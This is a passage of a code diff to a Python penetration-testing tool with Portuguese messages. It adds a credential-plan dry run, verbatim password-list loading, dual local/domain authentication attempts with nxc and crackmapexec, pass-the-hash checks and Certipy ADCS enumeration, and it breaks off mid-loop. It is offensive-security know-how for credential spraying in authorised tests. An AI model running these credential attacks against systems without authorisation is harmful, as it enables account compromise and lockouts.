@@ -67,7 +67,7 @@ APP_NAME = "Bird Scan Internal"
 #   python3 bird-scan-internal.py --bump patch    # correção
 #   python3 bird-scan-internal.py --bump minor    # nova funcionalidade
 #   python3 bird-scan-internal.py --bump major    # quebra de compatibilidade
-APP_VERSION_INFO: tuple[int, ...] = (0, 3, 0, 1)
+APP_VERSION_INFO: tuple[int, ...] = (0, 6, 2, 0)
 VERSION_MAX_COMPONENTS = 6
 VERSION_MAX_VALUE = 9999
 APP_VERSION = ".".join(str(part) for part in APP_VERSION_INFO)
@@ -126,6 +126,10 @@ FUZZ_DASHBOARD_TOOLS = ("Gobuster", "Feroxbuster", "Dirsearch")
 WEB_MAX_BODY_BYTES = 1048576
 DIRSEARCH_MAX_RESULTS_PER_BASE = 200
 BOUNDED_COMMAND_CAPTURE_BYTES = 65536
+# Service/enumeration commands are parsed (auth success, enum4linux, NSE), so
+# their in-memory capture must not cut the transcript short; the bound only
+# protects against pathological output.
+SERVICE_CAPTURE_LIMIT_BYTES = 8 * 1024 * 1024
 REPORT_RAW_PREVIEW_CHARS = 8192
 REPORT_PAGE_SIZE = 80
 
@@ -640,6 +644,7 @@ class ReportRenderContext:
     service_interactions: dict[tuple[Any, ...], str] = field(default_factory=dict)
     ad_secrets: dict[str, dict[str, Any]] = field(default_factory=dict)
     kerberos_hashes: dict[str, list[dict[str, str]]] = field(default_factory=dict)
+    command_id_seq: int = 0
 
 
 REPORT_RENDER_CONTEXT: ContextVar[ReportRenderContext | None] = ContextVar(
@@ -1199,6 +1204,22 @@ def build_arg_parser() -> argparse.ArgumentParser:
         ),
     )
     auth_group.add_argument(
+        "--credential-comments",
+        action="store_true",
+        help=(
+            "Treat '#' as a comment in credential lists. Default: disabled — every line is used "
+            "exactly as written (a password like '#Senha123' or 'Pass#123' is kept intact)."
+        ),
+    )
+    auth_group.add_argument(
+        "--auth-plan",
+        action="store_true",
+        help=(
+            "Print the credential plan (pairing mode, list sizes, effective pairs, eligible services "
+            "and validators) and exit without touching the network."
+        ),
+    )
+    auth_group.add_argument(
         "--domain",
         "-d",
         help=(
@@ -1251,6 +1272,7 @@ def has_cli_input(args: argparse.Namespace) -> bool:
         or args.resume
         or args.check_deps
         or args.self_test
+        or getattr(args, "auth_plan", False)
     )
 
 
@@ -1327,7 +1349,7 @@ def validate_credential_attack_args(args: argparse.Namespace) -> None:
     mode = getattr(args, "auth_attack_mode", "pitchfork") or "pitchfork"
     for option in ("password_username_file", "hash_username_file"):
         path = getattr(args, option, None)
-        if path and not load_credential_list_file(path):
+        if path and not load_credential_list_file(path, allow_comments=getattr(args, "credential_comments", False)):
             raise BirdScanUsageError(f"Lista de usuários sem entradas em --{option.replace('_', '-')}: {path}")
     credential_groups(args)  # Validate isolation before any discovery/network work.
     if mode in {"single-user", "single-pass", "single-user-pass"}:
@@ -1545,8 +1567,41 @@ def _load_state_checked(path: Path) -> ScanState:
     for ip, host_data in data.get("hosts", {}).items():
         host_data.setdefault("aliases", [])
         state.hosts[ip] = HostRecord(**host_data)
+
+    def validated_port(entry: dict[str, Any], label: str) -> int:
+        """Coerce a port from a resumed state and reject impossible values.
+
+        A hand-edited or truncated state.json could carry ``null``/text ports;
+        without this check the failure surfaces much later as a bare TypeError
+        while sorting or rendering the report.
+        """
+        raw_value = entry.get("port")
+        if isinstance(raw_value, bool) or raw_value is None:
+            raise ValueError(f"Invalid {label} port: {raw_value!r}")
+        try:
+            port_value = int(str(raw_value).strip())
+        except (TypeError, ValueError):
+            raise ValueError(f"Invalid {label} port: {raw_value!r}") from None
+        if not 1 <= port_value <= 65535:
+            raise ValueError(f"{label} port out of range: {port_value}")
+        entry["port"] = port_value
+        return port_value
+
+    for entry in data.get("services", []):
+        if not isinstance(entry, dict):
+            raise ValueError("Invalid service entry")
+        validated_port(entry, "service")
     state.services = [ServiceRecord(**item) for item in data.get("services", [])]
+    for entry in data.get("web_endpoints", []):
+        if not isinstance(entry, dict):
+            raise ValueError("Invalid web endpoint entry")
+        validated_port(entry, "web endpoint")
     state.web_endpoints = [WebEndpoint(**item) for item in data.get("web_endpoints", [])]
+    for entry in data.get("evidence", []):
+        if not isinstance(entry, dict):
+            raise ValueError("Invalid evidence entry")
+        if entry.get("port") is not None:
+            validated_port(entry, "evidence")
     state.evidence = [Evidence(**item) for item in data.get("evidence", [])]
     return state
 
@@ -1574,7 +1629,7 @@ def write_csv_export(state: ScanState) -> Path:
             fieldnames=["ip", "hostname", "aliases", "port", "protocol", "service", "product", "version", "state", "source"],
         )
         writer.writeheader()
-        for service in sorted(state.services, key=lambda item: (item.ip, item.port)):
+        for service in sorted(state.services, key=lambda item: (item.ip, item.port or 0)):
             host = state.hosts.get(service.ip, HostRecord(ip=service.ip))
             writer.writerow(
                 {
@@ -1616,7 +1671,7 @@ def write_markdown_export(state: ScanState) -> Path:
         port = f":{item.port}" if item.port else ""
         lines.append(f"- **{item.severity.upper()}** `{item.ip}{port}` {item.title} - {item.description}")
     lines.extend(["", "## Services", ""])
-    for service in sorted(state.services, key=lambda item: (item.ip, item.port)):
+    for service in sorted(state.services, key=lambda item: (item.ip, item.port or 0)):
         descriptor = " ".join(part for part in [service.service, service.product, service.version] if part)
         lines.append(f"- `{service.ip}:{service.port}/{service.protocol}` {descriptor}".rstrip())
     private_write_text(path, "\n".join(lines) + "\n")
@@ -1775,8 +1830,47 @@ def parse_ip_port_file(path: Path, state: ScanState, logger: Logger) -> None:
         stripped = normalize_target_token(line)
         if not stripped:
             continue
+        # Unbracketed IPv6 keeps multiple colons.  Splitting at the generic
+        # "host:port" pattern would fragment it into bogus hosts ("1", "eth0"),
+        # so interpret ``address:port`` first and fall through when it does not
+        # form a valid IPv6 address.
+        if stripped.count(":") >= 2 and not stripped.startswith("["):
+            host_part, _, port_part = stripped.rpartition(":")
+            proto_part = ""
+            if "/" in port_part:
+                port_part, _, proto_part = port_part.partition("/")
+            address_text = host_part.split("%", 1)[0]
+            parsed_address = None
+            try:
+                parsed_address = ipaddress.ip_address(address_text)
+            except ValueError:
+                parsed_address = None
+            if (
+                parsed_address is not None
+                and parsed_address.version == 6
+                and port_part.isdigit()
+                and 1 <= int(port_part) <= 65535
+            ):
+                port = int(port_part)
+                state.upsert_host(host_part, sources=["ip-port-import"])
+                state.add_service(
+                    ServiceRecord(
+                        ip=host_part,
+                        port=port,
+                        protocol=(proto_part or "tcp").lower(),
+                        service=guess_service_by_port(port),
+                        source=f"ip-port:{path.name}",
+                    )
+                )
+                parsed_count += 1
+                continue
         matches = re.findall(r"(?:\[([0-9A-Fa-f:]+)\]|([A-Za-z0-9_.-]+)):(\d{1,5})(?:/(tcp|udp))?", stripped, flags=re.I)
         if not matches:
+            if stripped.count(":") >= 2:
+                logger.warn(
+                    f"Entrada IPv6 não reconhecida ignorada em {path.name}: {stripped!r} "
+                    "(use o formato [ipv6]:porta)"
+                )
             continue
         for ipv6_host, named_host, port_text, proto in matches:
             try:
@@ -1975,7 +2069,10 @@ def parse_nmap_xml(text: str, state: ScanState, source: str, raw_file: str = "",
         root = ET.fromstring(text)
     except ET.ParseError as exc:
         if logger:
-            logger.warn(f"XML Nmap malformado (possivelmente truncado): {exc}; tentando outros formatos")
+            logger.warn(
+                f"XML Nmap malformado em {source}: {exc}. "
+                "Nenhum host/serviço deste arquivo foi importado (o restante da execução continua)."
+            )
         return False
     for host in root.findall("host"):
         status = host.find("status")
@@ -2186,6 +2283,8 @@ def parse_nmap_gnmap(text: str, state: ScanState, source: str) -> None:
         if not host_match:
             continue
         ip, hostname = host_match.groups()
+        if not is_valid_host_token(ip):
+            continue
         if "Status:" in line:
             status = extract_regex(line, r"Status:\s*([A-Za-z]+)").lower()
             if status and status != "up":
@@ -2315,13 +2414,37 @@ def parse_nmap_discovered_open_ports(text: str, state: ScanState, source: str) -
         )
 
 
+HOST_TOKEN_RE = re.compile(r"^[A-Za-z0-9](?:[A-Za-z0-9._-]{0,252})$")
+
+
+def is_valid_host_token(value: str) -> bool:
+    """True for an IP literal or a plausible hostname token."""
+    candidate = str(value or "").strip()
+    if not candidate:
+        return False
+    try:
+        ipaddress.ip_address(candidate)
+        return True
+    except ValueError:
+        return bool(HOST_TOKEN_RE.match(candidate))
+
+
 def parse_nmap_report_target(value: str) -> tuple[str, str]:
+    """Return (host, hostname) only when the target token is a real host.
+
+    A malformed report line (single-line file, trailing text) used to become a
+    phantom host named after the whole remainder, which then polluted the report
+    and the exports.  Valid IPs and hostnames keep working.
+    """
     paren_match = re.match(r"(.+?)\s+\(([^)]+)\)$", value)
     if paren_match:
         hostname = paren_match.group(1).strip()
         ip = paren_match.group(2).strip()
         return ip, hostname
-    return value, ""
+    candidate = str(value or "").strip()
+    if is_valid_host_token(candidate):
+        return candidate, ""
+    return "", ""
 
 
 def nmap_timing_for_args(args: argparse.Namespace) -> str:
@@ -2377,6 +2500,25 @@ def build_udp_nmap_command(args: argparse.Namespace, targets: list[str], output_
         command.insert(command.index("nmap") + 1, "-6")
     command.extend(targets)
     return command
+
+
+def target_ip_versions(targets: Iterable[str]) -> set[int]:
+    """Address families present in an explicit target list (hostnames ignored)."""
+    versions: set[int] = set()
+    for target in targets:
+        text = str(target).strip()
+        if not text or is_custom_nmap_command(text):
+            continue
+        try:
+            versions.add(ipaddress.ip_address(text).version)
+            continue
+        except ValueError:
+            pass
+        try:
+            versions.add(ipaddress.ip_network(text, strict=False).version)
+        except ValueError:
+            continue
+    return versions
 
 
 def targets_are_ipv6_only(targets: list[str]) -> bool:
@@ -2449,6 +2591,14 @@ def run_nmap_discovery(args: argparse.Namespace, state: ScanState, targets: list
     custom_targets = [target for target in targets if is_custom_nmap_command(target)]
     if custom_targets and len(targets) != 1:
         raise BirdScanUsageError("Um comando Nmap customizado não pode ser combinado com outros targets.")
+    if target_ip_versions(targets) == {4, 6}:
+        # nmap refuses to scan IPv4 and IPv6 in the same execution (-6 selects
+        # the family for the whole run), so fail with a clear message instead of
+        # letting nmap report a confusing resolution error.
+        raise BirdScanUsageError(
+            "Alvos IPv4 e IPv6 na mesma execução não são suportados pelo Nmap. "
+            "Separe em duas execuções (uma por família) ou importe com --from-nmap."
+        )
     custom_output_paths: list[Path] = []
     if len(targets) == 1 and is_custom_nmap_command(targets[0]):
         custom_command_str = targets[0].strip()
@@ -3731,21 +3881,35 @@ def credential_pair_slug(pair: CredentialPair) -> str:
     return safe_filename(f"{principal or 'anonymous'}_{method}_{digest}")
 
 
-def load_credential_list_file(path: str | None, *, strip_inline_comments: bool = True) -> list[str]:
+def load_credential_list_file(path: str | None, *, allow_comments: bool = False) -> list[str]:
+    """Load a credential list exactly as written.
+
+    By default every line is a credential: ``#`` is not a comment marker, so a
+    password such as ``#Senha123`` (or ``Pass#123``) survives untouched, and a
+    line keeps its spaces.  Only the line terminator is removed and empty lines
+    are skipped.  ``allow_comments`` restores ``#`` comment handling for
+    operators who use annotated lists.
+    """
     if not path:
         return []
     file_path = Path(path)
     if not file_path.is_file():
         return []
     entries: list[str] = []
-    for line in file_path.read_text(encoding="utf-8", errors="replace").splitlines():
-        token = line.strip()
-        if not token or token.startswith("#"):
-            continue
-        if strip_inline_comments and "#" in token:
+    text = file_path.read_text(encoding="utf-8", errors="replace")
+    for raw_line in text.split("\n"):
+        line = raw_line[:-1] if raw_line.endswith("\r") else raw_line
+        if allow_comments:
+            token = line.strip()
+            if not token or token.startswith("#"):
+                continue
             token = token.split("#", 1)[0].strip()
-        if token:
-            entries.append(token)
+            if token:
+                entries.append(token)
+            continue
+        if line == "":
+            continue
+        entries.append(line)
     return entries
 
 
@@ -3760,9 +3924,9 @@ def collect_credential_usernames(args: argparse.Namespace) -> list[str]:
     users: list[str] = []
     if args.username:
         users.append(args.username)
-    users.extend(load_credential_list_file(getattr(args, "username_file", None)))
+    users.extend(load_credential_list_file(getattr(args, "username_file", None), allow_comments=getattr(args, "credential_comments", False)))
     for option in ("password_username_file", "hash_username_file"):
-        users.extend(load_credential_list_file(getattr(args, option, None)))
+        users.extend(load_credential_list_file(getattr(args, option, None), allow_comments=getattr(args, "credential_comments", False)))
     return users
 
 
@@ -3770,7 +3934,7 @@ def collect_credential_passwords(args: argparse.Namespace) -> list[str]:
     passwords: list[str] = []
     if args.password:
         passwords.append(args.password)
-    passwords.extend(load_credential_list_file(getattr(args, "password_file", None), strip_inline_comments=False))
+    passwords.extend(load_credential_list_file(getattr(args, "password_file", None), allow_comments=getattr(args, "credential_comments", False)))
     return passwords
 
 
@@ -3778,7 +3942,7 @@ def collect_credential_hashes(args: argparse.Namespace) -> list[str]:
     hashes: list[str] = []
     if args.ntlm_hash:
         hashes.append(args.ntlm_hash)
-    hashes.extend(load_credential_list_file(getattr(args, "ntlm_hash_file", None), strip_inline_comments=False))
+    hashes.extend(load_credential_list_file(getattr(args, "ntlm_hash_file", None), allow_comments=getattr(args, "credential_comments", False)))
     return hashes
 
 
@@ -3811,13 +3975,13 @@ def credential_groups(args: argparse.Namespace) -> list[CredentialGroup]:
     ):
         user_path = getattr(args, user_option, None) or shared_path
         if user_path not in cache:
-            cache[user_path] = load_credential_list_file(user_path)
+            cache[user_path] = load_credential_list_file(user_path, allow_comments=getattr(args, "credential_comments", False))
         users = cache[user_path]
         # An explicitly supplied (even empty) user list never falls back to -u.
         if not user_path and username and not has_manual_pair:
             users = [username]
         secret_path = getattr(args, secret_option, None)
-        file_secrets = load_credential_list_file(secret_path, strip_inline_comments=False)
+        file_secrets = load_credential_list_file(secret_path, allow_comments=getattr(args, "credential_comments", False))
         if file_secrets:
             # A complete manual identity must never leak into a file group.
             if not users and has_manual_pair and not user_path:
@@ -3952,9 +4116,10 @@ def authentication_domain_contexts(args: argparse.Namespace, state: ScanState) -
         for value in (host.hostname.strip().strip("."), host.fqdn.split(".", 1)[0].strip())
         if value
     }
+    discovered_domains: list[str] = []
     for domain in discovered_local_domains(hosts):
         if domain.casefold() not in local_machine_names:
-            append(domain, discovered=True)
+            discovered_domains.append(domain)
     for item in state.evidence:
         if item.category not in {"smb", "ldap", "ad", "kerberos"}:
             continue
@@ -3964,7 +4129,20 @@ def authentication_domain_contexts(args: argparse.Namespace, state: ScanState) -
             continue
         domain = str(item.data.get("domain", "") if item.data else "")
         if domain.casefold().strip().strip(".") not in local_machine_names:
-            append(domain, discovered=True)
+            discovered_domains.append(domain)
+    # A short NetBIOS name ("ACME") is the same directory as "ACME.LOCAL".  Once
+    # a dotted domain is known, testing both would double every credential
+    # attempt (and the lockout exposure) without adding a distinct realm.
+    dotted_known = any("." in value.strip().strip(".") for value in contexts + [
+        domain for domain in discovered_domains if domain
+    ])
+    for domain in discovered_domains:
+        value = str(domain or "").strip().strip(".")
+        if not value:
+            continue
+        if dotted_known and "." not in value:
+            continue
+        append(domain, discovered=True)
     return contexts
 
 
@@ -4077,6 +4255,7 @@ def record_auth_attempt_evidence(
     uses_hash: bool = False,
     password_only: bool = False,
     local_auth: bool = False,
+    inconclusive: bool = False,
 ) -> None:
     guest = protocol == "smb" and smb_guest_session(transcript)
     success = success and not guest
@@ -4129,6 +4308,7 @@ def record_auth_attempt_evidence(
                 "tool": tool,
                 "password_only": password_only,
                 "output_excerpt": transcript[:4000],
+                "auth_inconclusive": bool(inconclusive),
             },
         )
     )
@@ -4202,9 +4382,14 @@ def run_nxc_auth_attempt(
     pair: CredentialPair,
     mode: str,
     uses_hash: bool,
+    local_auth_override: bool | None = None,
 ) -> None:
     password_only = protocol == "vnc"
-    local_auth = protocol in WINDOWS_LOCAL_AUTH_PROTOCOLS and not pair.domain
+    local_auth = (
+        local_auth_override
+        if local_auth_override is not None
+        else (protocol in WINDOWS_LOCAL_AUTH_PROTOCOLS and not pair.domain)
+    )
     if password_only:
         if pair.is_hash:
             return
@@ -4229,7 +4414,8 @@ def run_nxc_auth_attempt(
     slug = credential_pair_slug(pair)
     output_file = raw_dir / f"nxc_{protocol}_{safe_filename(service.ip)}_{service.port}_{slug}.txt"
     result = run_service_command(command, output_file, args, logger, secrets)
-    success = nxc_auth_success(result.stdout + result.stderr, "" if password_only else pair.username)
+    transcript = command_transcript(result)
+    success = nxc_auth_success(transcript, "" if password_only else pair.username)
     record_auth_attempt_evidence(
         state,
         service,
@@ -4241,10 +4427,11 @@ def run_nxc_auth_attempt(
         success=success,
         command=shell_join(result.command),
         raw_output_file=relpath(result.output_file or "", state.output_dir),
-        transcript=result.stdout + result.stderr,
+        transcript=transcript,
         uses_hash=uses_hash,
         password_only=password_only,
         local_auth=local_auth,
+        inconclusive=result.returncode in {124, 127, 130},
     )
 
 
@@ -4349,8 +4536,9 @@ def run_crackmapexec_auth_attempt(
     pair: CredentialPair,
     mode: str,
     uses_hash: bool,
+    local_auth_override: bool | None = None,
 ) -> None:
-    local_auth = not pair.domain
+    local_auth = not pair.domain if local_auth_override is None else local_auth_override
     cred_args, secrets = credential_args_for_attempt(
         args,
         "crackmapexec",
@@ -4366,7 +4554,8 @@ def run_crackmapexec_auth_attempt(
     slug = credential_pair_slug(pair)
     output_file = raw_dir / f"cme_smb_{safe_filename(service.ip)}_{service.port}_{slug}.txt"
     result = run_service_command(command, output_file, args, logger, secrets)
-    success = nxc_auth_success(result.stdout + result.stderr, pair.username)
+    transcript = command_transcript(result)
+    success = nxc_auth_success(transcript, pair.username)
     record_auth_attempt_evidence(
         state,
         service,
@@ -4378,9 +4567,10 @@ def run_crackmapexec_auth_attempt(
         success=success,
         command=shell_join(result.command),
         raw_output_file=relpath(result.output_file or "", state.output_dir),
-        transcript=result.stdout + result.stderr,
+        transcript=transcript,
         uses_hash=uses_hash,
         local_auth=local_auth,
+        inconclusive=result.returncode in {124, 127, 130},
     )
 
 
@@ -4404,8 +4594,9 @@ def run_pth_winexe_auth_attempt(
     secrets = [pair.password] if pair.password else []
     result = run_service_command(command, output_file, args, logger, secrets)
     
+    transcript = command_transcript(result)
     success = result.returncode == 0 and marker in {
-        line.strip() for line in result.stdout.splitlines() if line.strip()
+        line.strip() for line in transcript.splitlines() if line.strip()
     }
     record_auth_attempt_evidence(
         state,
@@ -4418,9 +4609,10 @@ def run_pth_winexe_auth_attempt(
         success=success,
         command=shell_join(command),
         raw_output_file=relpath(result.output_file or "", state.output_dir),
-        transcript=result.stdout + result.stderr,
+        transcript=transcript,
         uses_hash=uses_hash,
         local_auth=not pair.domain,
+        inconclusive=result.returncode in {124, 127, 130},
     )
 
 
@@ -4462,7 +4654,7 @@ def run_postgres_auth_attempt(
         env=env,
         input_text="SELECT version(); \\l\n",
     )
-    combined = result.stdout + result.stderr
+    combined = command_transcript(result)
     # A missing database is not proof of successful authentication: PostgreSQL
     # can reject the startup packet before validating the supplied password.
     # Only an executed SQL query (exit status 0) is accepted as proof.
@@ -4508,6 +4700,87 @@ def evidence_auth_identity(item: Evidence) -> tuple[str, int, str, str] | None:
     return item.ip, item.port, protocol, credential_id
 
 
+def auth_plan_summary(args: argparse.Namespace, state: ScanState) -> dict[str, Any]:
+    """Describe what the credential phase will actually attempt.
+
+    The pairing mode is easy to misread: pitchfork tests ``min(users, secrets)``
+    combinations, so two unrelated lists of the same size exercise only N pairs
+    instead of N*M.  Making the numbers explicit is what lets an operator notice
+    that a valid credential was never tried.
+    """
+    groups = credential_groups(args)
+    mode = resolve_auth_attack_mode(args)
+    domains = authentication_domain_contexts(args, state)
+    base_pairs = credential_pair_count(args, domains=[""])
+    effective_pairs = base_pairs * len(domains)
+    users = collect_credential_usernames(args)
+    passwords = collect_credential_passwords(args)
+    hashes = collect_credential_hashes(args)
+    secrets_total = len(passwords) + len(hashes)
+    combinations = len(users) * secrets_total
+    services = auth_capable_services(state)
+    routes = [
+        (service.ip, service.port, name, tool)
+        for service in services
+        for name, tool in auth_protocols_for_service(service)
+    ]
+    return {
+        "mode": mode,
+        "groups": [
+            {"label": group.label, "users": len(group.users), "secrets": len(group.secrets),
+             "mode": credential_group_mode(args, group)}
+            for group in groups
+        ],
+        "users": len(users),
+        "passwords": len(passwords),
+        "hashes": len(hashes),
+        "contexts": domains,
+        "base_pairs": base_pairs,
+        "effective_pairs": effective_pairs,
+        "combinations": combinations,
+        "services": [(service.ip, service.port) for service in services],
+        "routes": routes,
+    }
+
+
+def auth_plan_lines(plan: dict[str, Any]) -> list[str]:
+    """Human-readable lines for the console and the report."""
+    groups = ", ".join(
+        f"{group['label']} ({group['users']}u x {group['secrets']}s, {group['mode']})"
+        for group in plan["groups"]
+    ) or "nenhum"
+    context_names = [context or "local" for context in plan["contexts"]]
+    lines = [
+        f"modo de pareamento: {plan['mode']}",
+        f"listas: {plan['users']} usuário(s), {plan['passwords']} senha(s), {plan['hashes']} hash(es)",
+        f"grupos: {groups}",
+        f"contextos de autenticação: {', '.join(context_names)}",
+        f"pares por contexto: {plan['base_pairs']} · tentativas totais por serviço: {plan['effective_pairs']}",
+        f"combinações possíveis (usuários x segredos): {plan['combinations']}",
+        f"serviços elegíveis: {len(plan['services'])} · validações: {len(plan['routes'])}",
+    ]
+    if plan["effective_pairs"] < plan["combinations"]:
+        lines.append(
+            f"ATENÇÃO: {plan['effective_pairs']} de {plan['combinations']} combinações serão testadas "
+            f"no modo {plan['mode']}. Use --auth-attack-mode clusterbomb para testar todas, "
+            "ou single-pass para uma senha contra todos os usuários."
+        )
+    return lines
+
+
+def print_auth_plan(args: argparse.Namespace, state: ScanState, logger: Logger) -> int:
+    plan = auth_plan_summary(args, state)
+    logger.stage("Plano de autenticação", "somente leitura, nenhuma credencial é testada")
+    for line in auth_plan_lines(plan):
+        logger.info(line)
+    for group in plan["groups"]:
+        logger.info(f"  grupo {group['label']}: {group['users']} usuário(s) x {group['secrets']} segredo(s)")
+    for ip, port, name, tool in plan["routes"]:
+        logger.info(f"  {ip}:{port} → {name} via {tool}")
+    state.metadata["credential_plan"] = plan
+    return 0
+
+
 def run_credential_auth_enumeration(args: argparse.Namespace, state: ScanState, logger: Logger) -> None:
     mode = resolve_auth_attack_mode(args)
     base_pair_count = credential_pair_count(args, domains=[""])
@@ -4520,6 +4793,7 @@ def run_credential_auth_enumeration(args: argparse.Namespace, state: ScanState, 
     passwords = collect_credential_passwords(args)
     warn_credential_list_size_mismatch(args, mode, users, passwords, logger, state)
     services = auth_capable_services(state)
+    credential_plan = auth_plan_summary(args, state)
     route_cache = {
         (service.ip, service.port, service.protocol): auth_protocols_for_service(service)
         for service in sorted_services_unique(state.services)
@@ -4537,16 +4811,31 @@ def run_credential_auth_enumeration(args: argparse.Namespace, state: ScanState, 
         protocols = route_cache.get((service.ip, service.port, service.protocol), [])
         methods = [name for name, _ in protocols]
         reason = "Ferramentas: " + ", ".join(f"{name}/{tool}" for name, tool in protocols) if protocols else "Sem validador automático disponível para este serviço; suporte não implementado ou dependência ausente."
+        plan_text = (
+            f"modo {credential_plan['mode']} · {credential_plan['base_pairs']} par(es) x "
+            f"{len(credential_plan['contexts'])} contexto(s) = {credential_plan['effective_pairs']} "
+            f"tentativa(s) por serviço · {credential_plan['users']} usuário(s), "
+            f"{credential_plan['passwords']} senha(s), {credential_plan['hashes']} hash(es)"
+        )
         state.add_evidence(Evidence(
             category="auth", ip=service.ip, port=service.port, service=service.service,
-            title="Cobertura de autenticação", description=reason, severity="info",
-            data={"auth_coverage": "available" if protocols else "unavailable", "protocols": methods},
+            title="Cobertura de autenticação",
+            description=f"{reason} — {plan_text}",
+            severity="info",
+            data={"auth_coverage": "available" if protocols else "unavailable",
+                  "protocols": methods, "auth_mode": credential_plan["mode"],
+                  "pairs": credential_plan["effective_pairs"],
+                  "users": credential_plan["users"], "passwords": credential_plan["passwords"],
+                  "hashes": credential_plan["hashes"]},
         ))
     if not services:
         logger.info("No auth-capable services found for credential attempts")
         return
     state.metadata["credential_spray_mode"] = mode
     state.metadata["credential_spray_pairs"] = pair_count
+    state.metadata["credential_plan"] = credential_plan
+    for plan_line in auth_plan_lines(credential_plan):
+        logger.info(plan_line)
     state.metadata["credential_base_pairs"] = base_pair_count
     state.metadata["credential_auth_local"] = True
     state.metadata["credential_auth_domains"] = [domain for domain in auth_domains if domain]
@@ -4592,12 +4881,34 @@ def run_credential_auth_enumeration(args: argparse.Namespace, state: ScanState, 
                         data={"auth_result": "unsupported", "protocol": protocol, "tool": tool},
                     ))
                     continue
-                if tool == "nxc":
-                    run_nxc_auth_attempt(args, state, logger, raw_dir, service, protocol, pair, mode, pair.is_hash)
+                if tool in {"nxc", "crackmapexec"}:
+                    # Without any discovered domain the local context is all we
+                    # have, and forcing --local-auth would make every DOMAIN
+                    # credential fail.  Test both identities then: local SAM
+                    # (--local-auth) and the tool default, which negotiates the
+                    # domain on its own.
+                    local_variants: tuple[bool | None, ...] = (
+                        (True, False)
+                        if (
+                            not pair.domain
+                            and not domains_available
+                            and protocol in WINDOWS_LOCAL_AUTH_PROTOCOLS
+                        )
+                        else (None,)
+                    )
+                    for local_variant in local_variants:
+                        if tool == "nxc":
+                            run_nxc_auth_attempt(
+                                args, state, logger, raw_dir, service, protocol, pair, mode,
+                                pair.is_hash, local_auth_override=local_variant,
+                            )
+                        else:
+                            run_crackmapexec_auth_attempt(
+                                args, state, logger, raw_dir, service, pair, mode,
+                                pair.is_hash, local_auth_override=local_variant,
+                            )
                 elif tool == "sshpass" and protocol == "ssh":
                     run_ssh_auth_attempt(args, state, logger, raw_dir, service, pair, mode)
-                elif tool == "crackmapexec":
-                    run_crackmapexec_auth_attempt(args, state, logger, raw_dir, service, pair, mode, pair.is_hash)
                 elif tool == "pth-winexe":
                     run_pth_winexe_auth_attempt(args, state, logger, raw_dir, service, pair, mode, pair.is_hash)
                 elif tool == "psql":
@@ -4610,7 +4921,7 @@ def run_credential_auth_enumeration(args: argparse.Namespace, state: ScanState, 
                     mysql_success = result.returncode == 0 and any(
                         line.strip() == "1" for line in result.stdout.splitlines()
                     )
-                    record_auth_attempt_evidence(state, service, category="database", protocol="mysql", tool="mysql", pair=pair, mode=mode, success=mysql_success, command=shell_join(result.command), raw_output_file=relpath(result.output_file or "", state.output_dir), transcript=result.stdout + result.stderr)
+                    record_auth_attempt_evidence(state, service, category="database", protocol="mysql", tool="mysql", pair=pair, mode=mode, success=mysql_success, command=shell_join(result.command), raw_output_file=relpath(result.output_file or "", state.output_dir), transcript=command_transcript(result))
                 elif tool == "native" and protocol == "ftp":
                     ftp_raw_dir = Path(state.output_dir) / RAW_DIR / "services" / "ftp"
                     ftp_raw_dir.mkdir(parents=True, exist_ok=True)
@@ -4629,11 +4940,23 @@ def run_credential_auth_enumeration(args: argparse.Namespace, state: ScanState, 
     # Replace only the prior results that were actually re-tested.  This is a
     # single linear pass (rather than scanning all evidence once per password)
     # and preserves historical credentials outside the current reauth plan.
+    # Attempts that never got a definitive answer (timeout, missing tool,
+    # interruption) must not erase a credential that was already proven.
     if refreshed_auth_identities:
+        inconclusive_identities = {
+            evidence_auth_identity(item)
+            for item in state.evidence[original_evidence_count:]
+            if item.data.get("auth_inconclusive")
+        }
+        replaceable_identities = {
+            identity
+            for identity in refreshed_auth_identities
+            if identity not in inconclusive_identities
+        }
         prior = [
             item
             for item in state.evidence[:original_evidence_count]
-            if evidence_auth_identity(item) not in refreshed_auth_identities
+            if evidence_auth_identity(item) not in replaceable_identities
         ]
         state.evidence = prior + list(state.evidence[original_evidence_count:])
 
@@ -4806,7 +5129,7 @@ def run_enum4linux_for_valid_smb_credentials(args: argparse.Namespace, state: Sc
 
     interesting_count = 0
     for service, credential, command, result in completed:
-        parsed = parse_enum4linux_output(result.stdout + result.stderr)
+        parsed = parse_enum4linux_output(command_transcript(result))
         interesting = bool(parsed.get("interesting"))
         if interesting:
             interesting_count += 1
@@ -5938,8 +6261,9 @@ def collect_kerbrute_results(args: argparse.Namespace, state: ScanState, *, fini
         if finish and process is not None and process.poll() is None:
             job["interrupted"] = True
             stop_kerbrute_process(process)
-        if finish and job.get("handle") is not None and not job["handle"].closed:
-            job["handle"].close()
+        # The worker owns the transcript handle (it opens it with ``with``) and
+        # closes it on exit.  Closing it from this thread could fail the worker's
+        # own flush, so only wait for the process here.
         # Consume new complete lines only; retain an unfinished line for the
         # next snapshot so split writes do not create truncated usernames.
         users = job.setdefault("valid_users", {})
@@ -6152,6 +6476,15 @@ def run_adcs_enumeration(args: argparse.Namespace, state: ScanState, logger: Log
         return
     raw_dir = Path(state.output_dir) / RAW_DIR / "services" / "adcs"
     raw_dir.mkdir(parents=True, exist_ok=True)
+    # Certipy v4 and v5 accept different flags (-save-old/-configuration vs
+    # -save-configuration/-write-configuration), so the report needs to know
+    # which major version is installed before generating copy commands.
+    version_probe = run_command([certipy, "--version"], timeout=15, logger=logger)
+    version_text = version_probe.stdout + version_probe.stderr
+    version_match = re.search(r"(\d+)\.(\d+)(?:\.(\d+))?", version_text)
+    if version_match:
+        state.metadata["certipy_version"] = f"{version_match.group(1)}.{version_match.group(2)}"
+        logger.info(f"Certipy detectado: v{state.metadata['certipy_version']}")
     tested = 0
     viable = 0
     for host_ip in ad_hosts:
@@ -6159,8 +6492,28 @@ def run_adcs_enumeration(args: argparse.Namespace, state: ScanState, logger: Log
         dc_ip = ad_dc_ip_for_host(state, host_ip)
         if not dc_ip:
             continue
-        credentials = ad_credentials_for_host(state, host_ip)[:ADCS_MAX_CREDENTIALS_PER_HOST]
-        for credential in credentials:
+        credentials = [
+            candidate
+            for candidate in ad_credentials_for_host(state, host_ip)
+            if ad_credential_rank(state, host_ip, candidate) < 4
+        ]
+        # The same identity can be recorded once per domain context; certipy is
+        # always invoked with the discovered realm, so identical runs must not
+        # be repeated (and the per-host cap counts unique identities only).
+        unique_credentials: list[dict[str, str]] = []
+        seen_identities: set[tuple[str, str, str]] = set()
+        for candidate in credentials:
+            candidate_user = candidate.get("username") or ""
+            if not candidate_user:
+                continue
